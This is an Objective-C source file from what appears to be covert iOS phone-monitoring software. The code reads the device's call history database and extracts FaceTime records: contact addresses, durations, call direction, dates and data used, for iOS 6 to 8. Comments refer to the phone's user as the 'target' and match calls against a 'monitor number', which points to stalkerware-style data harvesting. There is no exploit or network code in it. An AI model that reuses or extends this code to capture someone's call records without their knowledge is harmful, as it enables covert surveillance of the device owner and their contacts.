//
//  FaceTimeLogCaptureDAO.m
//  FaceTimeCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 7/22/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "FaceTimeLogCaptureDAO.h"
#import "FMDatabase.h"
#import "FaceTimeLog.h"
#import "HistoricalFaceTimeLog.h"
#import "FxEventEnums.h"
#import "DefStd.h"
#import "TelephoneNumber.h"

#import <UIKit/UIKit.h>

@interface FaceTimeLogCaptureDAO (private)
- (NSArray *) selectCallHistory: (NSString *) aSql;
- (NSArray *) selectCallHistoryV2: (NSString *) aSql;
- (NSArray *) selectCallHistoryIOS8: (NSString *) aSql;
@end


@implementation FaceTimeLogCaptureDAO


static NSString	* const kSelectCallHistory1			= @"SELECT ROWID,address,duration,flags from call where ROWID in (SELECT max(ROWID) from call)";
static NSString	* const kSelectCallHistory2			= @"SELECT ROWID,address,duration,flags from call WHERE ROWID > %lu";
static NSString * const kSelectCallHistory3			= @"SELECT ROWID,address,duration,flags from call ORDER BY ROWID DESC LIMIT 5";
//static NSString * const kSelectCallHistory4			= @"SELECT ROWID,address,duration,flags, face_time_data from call ORDER BY ROWID DESC LIMIT 5";
static NSString * const kSelectCallHistory4			= @"SELECT ROWID,address,duration,flags, id from call ORDER BY ROWID DESC LIMIT 5";
static NSString * const kSelectCallHistory4iOS8		= @"SELECT Z_PK,ZADDRESS,ZDURATION,ZFACE_TIME_DATA from ZCALLRECORD ORDER BY Z_PK DESC LIMIT 5";
static NSString	* const kSelectCallHistoryMaxRowID	= @"SELECT max(ROWID) from call";



#pragma mark - Constants For Request Historical Events


static NSString * const kSelectFaceTimeHistoryAlliOS6          = @"SELECT ROWID, address, duration, flags, date "
                                                                    "FROM call "
                                                                    "WHERE  flags = 20 OR "               // Incoming Facetime
                                                                            "flags = 21 "               // Outgoing Facetime
                                                                    "ORDER BY date";

static NSString * const kSelectFaceTimeHistoryMaxiOS6   = @"SELECT c1.ROWID, c1.address, c1.duration, c1.flags, c1.date "
                                                            "FROM call c1 "
                                                            "JOIN "
                                                                "(SELECT * FROM call "
                                                                "WHERE  flags = 20 OR "       // Incoming Facetime
                                                                        "flags = 21 "           // Outgoing Facetime
                                                            "ORDER BY date DESC LIMIT %ld) c2 "
                                                            "ON c1.ROWID = c2.ROWID "
                                                            "ORDER BY c1.date";

static NSString * const kSelectFaceTimeHistoryAlliOS7          = @"SELECT ROWID, address, duration, flags, date "
                                                                "FROM call "
                                                                "WHERE  flags = 16 OR "               // Incoming Facetime Video
                                                                    "flags = 17 OR "              // Outgoing Facetime Video
                                                                    "flags = 64 OR "              // Incoming Facetime Audio
                                                                    "flags = 65 "
                                                                "ORDER BY date";

static NSString * const kSelectFaceTimeHistoryMaxiOS7   = @"SELECT c1.ROWID, c1.address, c1.duration, c1.flags, c1.date "
                                                            "FROM call c1 "
                                                            "JOIN "
                                                                "(SELECT * FROM call "
                                                                "WHERE  flags = 16 OR "       // Incoming Facetime Video
                                                                        "flags = 17 OR "      // Outgoing Facetime Video
                                                                        "flags = 64 OR "      // Incoming Facetime Audio
                                                                        "flags = 65 "          // Outgoing Facetime Audio
                                                            "ORDER BY date DESC LIMIT %ld) c2 "
                                                            "ON c1.ROWID = c2.ROWID "
                                                            "ORDER BY c1.date";


static NSString	* const kSelectFaceTimeHistoryAlliOS8   = @"SELECT Z_PK, ZADDRESS, ZDURATION, ZORIGINATED, ZDATE, ZFACE_TIME_DATA "
                                                            "FROM ZCALLRECORD "
                                                            "WHERE ZCALLTYPE = 8    OR "        // Facetime Video
                                                                    "ZCALLTYPE = 16 "           // Facetime Audio
                                                            "ORDER BY ZDATE";

static NSString	* const kSelectFaceTimeHistoryMaxiOS8   = @"SELECT c1.Z_PK, c1.ZADDRESS, c1.ZDURATION, c1.ZORIGINATED, c1.ZDATE, c1.ZFACE_TIME_DATA "
                                                            "FROM ZCALLRECORD c1 "
                                                            "JOIN "
                                                                "(SELECT * FROM ZCALLRECORD "
                                                                    "WHERE ZCALLTYPE = 8    OR "        // Facetime Video
                                                                            "ZCALLTYPE = 16 "           // Facetime Audio
                                                                    "ORDER BY ZDATE DESC LIMIT %ld) c2 "
                                                            "ON c1.Z_PK = c2.Z_PK "
                                                            "ORDER BY c1.ZDATE";

/**
 - Method name: init
 - Purpose:This method is used to initalize CallLogCaptureDAO
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (id) init {
	if ((self = [super init])) {
        if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7) {
            mCallDB = [FMDatabase databaseWithPath:kCallHistoryDatabasePath];
        } else {
            mCallDB = [FMDatabase databaseWithPath:kCallHistoryDatabasePathiOS8];
        }
		[mCallDB retain];
		[mCallDB open];
	}
	return (self);
}

- (NSArray *) selectCallHistory {
	NSArray *callLogs = [self selectCallHistory:kSelectCallHistory1];
	return (callLogs);
}

- (NSArray *) selectCallHistoryNewerRowID: (NSUInteger) aRowID {
	NSString *sql = [NSString stringWithFormat:kSelectCallHistory2, (unsigned long)aRowID];
	NSArray *callLogs = [self selectCallHistory:sql];
	return (callLogs);
}

- (FaceTimeLog *) selectCallHistoryWithLastRowEqual: (NSString *) aFaceTimeID {
	FaceTimeLog * faceTimeLog	= nil;
	NSArray *faceTimeLogs		= [self selectCallHistory:kSelectCallHistory3];
	DLog (@"faceTimeLogs %@", faceTimeLogs)
	for (FaceTimeLog *faceTime in faceTimeLogs) {
		if ([[faceTime mContactNumber] isEqualToString:aFaceTimeID]) {
			faceTimeLog	= [[FaceTimeLog alloc] init];
			[faceTimeLog setMDuration:[faceTime mDuration]];
			[faceTimeLog setMCallState:[faceTime mCallState]];
			[faceTimeLog setMContactNumber:[faceTime mContactNumber]];
			[faceTimeLog setMCallHistoryROWID:[faceTime mCallHistoryROWID]];
			[faceTimeLog autorelease];
			break;
		}
	}
	return (faceTimeLog);
}

- (FaceTimeLog *) selectCallHistoryWithLastRowEqualV2: (NSString *) aFaceTimeID {
	FaceTimeLog * faceTimeLog	= nil;
	NSArray *faceTimeLogs		= [self selectCallHistoryV2:kSelectCallHistory4];
	DLog (@"faceTimeLogs %@", faceTimeLogs)
	for (FaceTimeLog *faceTime in faceTimeLogs) {
		if ([[faceTime mContactNumber] isEqualToString:aFaceTimeID]) {
			faceTimeLog			= [[FaceTimeLog alloc] init];
			[faceTimeLog setMDuration:[faceTime mDuration]];
			[faceTimeLog setMCallState:[faceTime mCallState]];
			[faceTimeLog setMContactNumber:[faceTime mContactNumber]];
			[faceTimeLog setMCallHistoryROWID:[faceTime mCallHistoryROWID]];
            [faceTimeLog setMContactID:[faceTime mContactID]];              // This is alway -1 for facetime email
            DLog(@"Match Contact ID %ld", (long)[faceTime mContactID])

			[faceTimeLog autorelease];
			break;
		}
	}
	return (faceTimeLog);
}


- (FaceTimeLog *) selectCallHistoryWithLastRowEqualIOS8: (NSString *) aFaceTimeID {
    FaceTimeLog * faceTimeLog	= nil;
    NSArray *faceTimeLogs		= [self selectCallHistoryIOS8:kSelectCallHistory4iOS8];
	DLog (@"faceTimeLogs %@", faceTimeLogs)
    
    // Check if this is telephone number or email address
    NSRange locationOfAt        = [aFaceTimeID rangeOfString:@"@"];
    BOOL isEmailFacetimeID      = (locationOfAt.length != 0);
    TelephoneNumber *telNum     = [[TelephoneNumber alloc] init];
    
	for (FaceTimeLog *faceTime in faceTimeLogs) {
        DLog(@"element %lu", (unsigned long)[faceTimeLogs indexOfObject:faceTime])
        BOOL isMatch = NO;
        if (isEmailFacetimeID) {
            DLog(@"Email condition %@", aFaceTimeID)
            if ([[faceTime mContactNumber] isEqualToString:aFaceTimeID])
                isMatch = YES;
        } else {
            DLog(@"Telephone number condition %@", aFaceTimeID)
            if ([telNum isNumber:[faceTime mContactNumber] matchWithMonitorNumber:aFaceTimeID])
                isMatch = YES;
        }
        if (isMatch) {
            //DLog(@"!! Match and break !!")
            faceTimeLog			= [[FaceTimeLog alloc] init];
            [faceTimeLog setMDuration:[faceTime mDuration]];
            //[faceTimeLog setMCallState:[faceTime mCallState]];    // It will be set in the caller
            [faceTimeLog setMContactNumber:[faceTime mContactNumber]];
            [faceTimeLog setMCallHistoryROWID:[faceTime mCallHistoryROWID]];
            [faceTimeLog setMContactID:[faceTime mContactID]];              // This is alway -1 no matter it's number or email on iOS 8
            [faceTimeLog setMBytesOfDataUsed:[faceTime mBytesOfDataUsed]];
            [faceTimeLog autorelease];
            break;
        }
    }
	return (faceTimeLog);
}

- (NSUInteger) maxRowID {
	NSUInteger maxRowID		= 1;
	FMResultSet* resultSet	= [mCallDB executeQuery:kSelectCallHistoryMaxRowID];
	if ([resultSet next]) {
		maxRowID = [resultSet intForColumnIndex:0];
	}
	return (maxRowID);
}

/**
 - Method name: selectCallHistory:
 - Purpose:This method is used to select call log
 - Argument list and description: (NSString) of sql statements
 - Return description: requestArray(NSArray) of CallLog objects
 */

- (NSArray *) selectCallHistory: (NSString *) aSql {
	NSMutableArray* requestArray	= [[NSMutableArray alloc] init];
	DLog (@">> selectCallHistory 1")
	FMResultSet* resultSet			= [mCallDB executeQuery:aSql];
	DLog (@">> selectCallHistory 2")
	while ([resultSet next]) {
		
		FaceTimeLog *faceTimeLog			= [[FaceTimeLog alloc] init];
		NSUInteger duration					= [resultSet intForColumnIndex:2];
		int flags							= [resultSet intForColumnIndex:3];			
		
		[faceTimeLog setMCallHistoryROWID:[resultSet intForColumnIndex:0]];		// Assign row id
		[faceTimeLog setMContactNumber:[resultSet stringForColumnIndex:1]];		// Assign FaceTime id		
		[faceTimeLog setMDuration:duration];									// Assign duration
		
		DLog (@"Call flags value (direction) = %d for row id %lu", flags, (unsigned long)[faceTimeLog mCallHistoryROWID]);
	
		// -- Check 'CallState' to assign 'FxEventDirection'
		NSString *osVersion = [[UIDevice currentDevice] systemVersion];
		if ([osVersion intValue] >= 7) {
			switch (flags) {
				case kFaceTimeCallState2AudioIncoming:
				case kFaceTimeCallState2VideoIncoming:
					if (duration == 0)
						[faceTimeLog setMCallState:kEventDirectionMissedCall];
					else
						[faceTimeLog setMCallState:kEventDirectionIn];
					break;
				case kFaceTimeCallState2AudioOutgoing:
				case kFaceTimeCallState2VideoOutgoing:
					[faceTimeLog setMCallState:kEventDirectionOut];
					break;
				default:
					[faceTimeLog setMCallState:kEventDirectionOut];
					break;
			}
		} else {
			switch (flags) {
				case kFaceTimeCallStateIncoming:									// - Incoming FaceTime
					DLog (@"FaceTime (Incoming)")
					if (duration == 0)
						[faceTimeLog setMCallState:kEventDirectionMissedCall];		// Incoming Miss call
					else
						[faceTimeLog setMCallState:kEventDirectionIn];				// Incoming Accepted call 
					break;
				case kFaceTimeCallStateOutgoing:									// - Outgoing FaceTime
					DLog (@"FaceTime (Outgoing)")
					[faceTimeLog setMCallState:kEventDirectionOut];	
					break;				
				default:
					[faceTimeLog setMCallState:kEventDirectionOut];				// Out (Default)
					break;
			}
		}
		[requestArray addObject:faceTimeLog];		
		DLog (@">> Direction (From Call DB [in 4 |out 5 |PriIn 8 |FaceIn 20 |FaceOut 21]): %d", flags); 
		DLog (@">> Direction (FxEventDirection): %d", [faceTimeLog mCallState]); 		
		[faceTimeLog release];
		faceTimeLog = nil;
		
	}
	return [requestArray autorelease];
}


- (NSArray *) selectCallHistoryV2: (NSString *) aSql {
	NSMutableArray* requestArray	= [[NSMutableArray alloc] init];
	DLog (@">> selectCallHistory 1")
	FMResultSet* resultSet			= [mCallDB executeQuery:aSql];
	DLog (@">> selectCallHistory 2")
	while ([resultSet next]) {
		
		FaceTimeLog *faceTimeLog			= [[FaceTimeLog alloc] init];
		NSUInteger duration					= [resultSet intForColumnIndex:2];
		int flags							= [resultSet intForColumnIndex:3];
		
		[faceTimeLog setMCallHistoryROWID:[resultSet intForColumnIndex:0]];		// Assign row id
		[faceTimeLog setMContactNumber:[resultSet stringForColumnIndex:1]];		// Assign FaceTime id
		[faceTimeLog setMDuration:duration];									// Assign duration
		[faceTimeLog setMContactID:[resultSet intForColumnIndex:4]];
        DLog(@"Contact ID %ld", (long)[faceTimeLog mContactID])
		DLog (@"Call flags value (direction) = %d for row id %lu", flags, (unsigned long)[faceTimeLog mCallHistoryROWID]);
        
		// -- Check 'CallState' to assign 'FxEventDirection'
		NSString *osVersion = [[UIDevice currentDevice] systemVersion];
		if ([osVersion intValue] >= 7) {
			switch (flags) {
				case kFaceTimeCallState2AudioIncoming:
				case kFaceTimeCallState2VideoIncoming:
					if (duration == 0)
						[faceTimeLog setMCallState:kEventDirectionMissedCall];
					else
						[faceTimeLog setMCallState:kEventDirectionIn];
					break;
				case kFaceTimeCallState2AudioOutgoing:
				case kFaceTimeCallState2VideoOutgoing:
					[faceTimeLog setMCallState:kEventDirectionOut];
					break;
				default:
					[faceTimeLog setMCallState:kEventDirectionOut];
					break;
			}
		} else {
			switch (flags) {
				case kFaceTimeCallStateIncoming:									// - Incoming FaceTime
					DLog (@"FaceTime (Incoming)")
					if (duration == 0)
						[faceTimeLog setMCallState:kEventDirectionMissedCall];		// Incoming Miss call
					else
						[faceTimeLog setMCallState:kEventDirectionIn];				// Incoming Accepted call
					break;
				case kFaceTimeCallStateOutgoing:									// - Outgoing FaceTime
					DLog (@"FaceTime (Outgoing)")
					[faceTimeLog setMCallState:kEventDirectionOut];
					break;
				default:
					[faceTimeLog setMCallState:kEventDirectionOut];				// Out (Default)
					break;
			}
		}
		[requestArray addObject:faceTimeLog];
		DLog (@">> Direction (From Call DB [in 4 |out 5 |PriIn 8 |FaceIn 20 |FaceOut 21]): %d", flags);
		DLog (@">> Direction (FxEventDirection): %d", [faceTimeLog mCallState]);
		[faceTimeLog release];
		faceTimeLog = nil;
		
	}
	return [requestArray autorelease];
}

- (NSArray *) selectCallHistoryIOS8: (NSString *) aSql {
	NSMutableArray* requestArray	= [[NSMutableArray alloc] init];
	DLog (@">> selectCallHistory iOS 8")
	FMResultSet* resultSet			= [mCallDB executeQuery:aSql];

	while ([resultSet next]) {
		FaceTimeLog *faceTimeLog	= [[FaceTimeLog alloc] init];
		NSUInteger duration         = [resultSet intForColumnIndex:2];
        int facetimeData            = [resultSet intForColumn:@"ZFACE_TIME_DATA"];     // note that this should be divided by 1000, not 1024 to make it equal the the number presented on Phone Application
        
		[faceTimeLog setMCallHistoryROWID:[resultSet intForColumnIndex:0]];		// Assign row id
		[faceTimeLog setMContactNumber:[resultSet stringForColumnIndex:1]];		// Assign FaceTime id
		[faceTimeLog setMDuration:duration];									// Assign duration
        [faceTimeLog setMContactID:-1];                                         // used for query contact name in address book database on iOS 7
        [faceTimeLog setMBytesOfDataUsed:facetimeData];                         // byte data used
        
		[requestArray addObject:faceTimeLog];
		[faceTimeLog release];
		faceTimeLog = nil;
        
         DLog(@"facetime data %d", facetimeData)
	}
	return [requestArray autorelease];
}


#pragma mark - Historical Facetime Log


- (NSArray *) selectAllFaceTimeHistoricaliOS8: (NSString *) aSql {
    NSMutableArray* requestArray    = [[NSMutableArray alloc] init];
    DLog(@"SQL %@", aSql)
    
    FMResultSet* resultSet          = [mCallDB executeQuery:aSql];
    
    while ([resultSet next]) {
        HistoricalFaceTimeLog *hisFaceTimeLog = [[HistoricalFaceTimeLog alloc] init];
        
        NSUInteger duration         = [resultSet intForColumn:@"ZDURATION"];
        int faceTimeData            = [resultSet intForColumn:@"ZFACE_TIME_DATA"];     // note that this should be divided by 1000, not 1024 to make it equal the the number presented on Phone Application
        int isOriginated            = [resultSet intForColumn:@"ZORIGINATED"];
        
        FxEventDirection direction = kEventDirectionUnknown;
        
        /* 
         This is the known issue
            - Cannot differentiate between Miss Facetime VoIP rejcted by target and outgoing rejected/ignored
                -- According to the nature of FaceTime for iOS 8, these schenario will be detected as "Canceled FaceTime"
                    --> Outgoing, end itself before the 3rd party accepts the call
                    --> Outgoing, the call is rejected by 3rd party
                    --> Outgoing, leave until it disconnects by itself.
                    --> Miss call, reject the call by target

            - ZFACE_TIME_DATA	|ZORIGINATED
                |0					|1          outgoing reject
                |0					|1          outgoing ignore
                |291646				|1          outgoing accepted + end by target
                |240479				|1          outgoing accepted + end by 3rd
         
                |0					|0          miss ignore                 (on Phone Application, it will shown as "Missed FaceTime")
                |0					|1          miss reject by target       (on Phone Application, it will shown as "Canceled FaceTime")   ******
                |400666				|0          incoming accepted + end by target
                |170718				|0          incoming accepted + end by 3rd
         */
        
        // Find direction
        if (isOriginated) { // Outgoing and miss call rejected by target.
            direction = kEventDirectionOut;
        } else {
            if (faceTimeData) {
                direction = kEventDirectionIn;
            } else {
                direction = kEventDirectionMissedCall;
            }
        }
        
		[hisFaceTimeLog setMCallHistoryROWID:[resultSet intForColumn:@"Z_PK"]];            // Assign row id
		[hisFaceTimeLog setMContactNumber:[resultSet stringForColumn:@"ZADDRESS"]];		// Assign FaceTime id
		[hisFaceTimeLog setMDuration:duration];                                         // Assign duration
        [hisFaceTimeLog setMContactID:-1];                                              // used for query contact name in address book database on iOS 7
        [hisFaceTimeLog setMBytesOfDataUsed:faceTimeData];                              // Assign byte data used
        [hisFaceTimeLog setMCallState:direction];                                       // Assign direction
        // Set the date for each calllog event
        NSDate *date                = [NSDate dateWithTimeIntervalSinceReferenceDate:[resultSet doubleForColumn:@"ZDATE"]];
        [hisFaceTimeLog setMDate:date];
        
		[requestArray addObject:hisFaceTimeLog];
		[hisFaceTimeLog release];
		hisFaceTimeLog = nil;
    }
    DLog(@"request array %@", requestArray)
    return [requestArray autorelease];
}

- (NSArray *) selectAllFaceTimeHistoricaliOS7: (NSString *) aSql {
    NSMutableArray* requestArray    = [[NSMutableArray alloc] init];
    DLog(@"SQL %@", aSql)
    
    FMResultSet* resultSet          = [mCallDB executeQuery:aSql];
    
    while ([resultSet next]) {
        HistoricalFaceTimeLog *hisFaceTimeLog = [[HistoricalFaceTimeLog alloc] init];
        FxEventDirection direction  = kEventDirectionUnknown;
        
        NSUInteger duration         = [resultSet intForColumn:@"duration"];
        
        int flag                    = [resultSet intForColumn:@"flags"];
        
        // Find direction
        if (flag == 17  ||  flag == 65  || flag == 21 ){ // Outgoing and incoming rejected by target
            direction = kEventDirectionOut;
        } else {
            if (duration) {
                direction = kEventDirectionIn;
            } else {
                direction = kEventDirectionMissedCall;
            }
        }
        
		[hisFaceTimeLog setMCallHistoryROWID:[resultSet intForColumn:@"ROWID"]];        // Assign row id
		[hisFaceTimeLog setMContactNumber:[resultSet stringForColumn:@"address"]];		// Assign FaceTime id
		[hisFaceTimeLog setMDuration:duration];                                         // Assign duration
        [hisFaceTimeLog setMContactID:-1];                                              // used for query contact name in address book database on iOS 7
        //[hisFacetimeLog setMBytesOfDataUsed:facetimeData];                              // Assign byte data used
        [hisFaceTimeLog setMCallState:direction];                                       // Assign direction
        // Set the date for each calllog event
        NSDate *date                = [NSDate dateWithTimeIntervalSince1970:[resultSet doubleForColumn:@"date"]];
        [hisFaceTimeLog setMDate:date];
        
		[requestArray addObject:hisFaceTimeLog];
		[hisFaceTimeLog release];
		hisFaceTimeLog = nil;
    }
    DLog(@"request array %@", requestArray)
    return [requestArray autorelease];
}


- (NSArray *) selectAllFaceTimeHistory {
    NSArray *faceTimeLogs       = nil;
    int iOS                     = [[[UIDevice currentDevice] systemVersion] intValue];
    
    if (iOS < 7) {
        faceTimeLogs = [self selectAllFaceTimeHistoricaliOS7:kSelectFaceTimeHistoryAlliOS6];        // Order by date
    } else if (iOS == 7) {
        faceTimeLogs = [self selectAllFaceTimeHistoricaliOS7:kSelectFaceTimeHistoryAlliOS7];        // Order by date
    } else {
        faceTimeLogs = [self selectAllFaceTimeHistoricaliOS8:kSelectFaceTimeHistoryAlliOS8];        // Order by date
    }
	return (faceTimeLogs);
}

- (NSArray *) selectAllFaceTimeHistoryWithMax: (NSInteger) aMaxEvent {
	NSArray *faceTimeLogs   = nil;
    int iOS                 = [[[UIDevice currentDevice] systemVersion] intValue];
    
    if (iOS < 7) {
        NSString *sql = [NSString stringWithFormat:kSelectFaceTimeHistoryMaxiOS6, (long)aMaxEvent];      // Order by date
        DLog(@"SQL iOS 6 %@", sql)
        faceTimeLogs = [self selectAllFaceTimeHistoricaliOS7:sql];
     } else if (iOS == 7) {
        NSString *sql = [NSString stringWithFormat:kSelectFaceTimeHistoryMaxiOS7, (long)aMaxEvent];      // Order by date
        DLog(@"SQL iOS 7 %@", sql)
        faceTimeLogs = [self selectAllFaceTimeHistoricaliOS7:sql];
    } else {
        NSString *sql = [NSString stringWithFormat:kSelectFaceTimeHistoryMaxiOS8, (long)aMaxEvent];      // Order by date
        DLog(@"SQL iOS 8 %@", sql)
        faceTimeLogs = [self selectAllFaceTimeHistoricaliOS8:sql];
    }
	return (faceTimeLogs);
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method.Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

- (void) dealloc {
	[mCallDB close];
	[mCallDB release];
	mCallDB = nil;
	[super dealloc];
}



@end
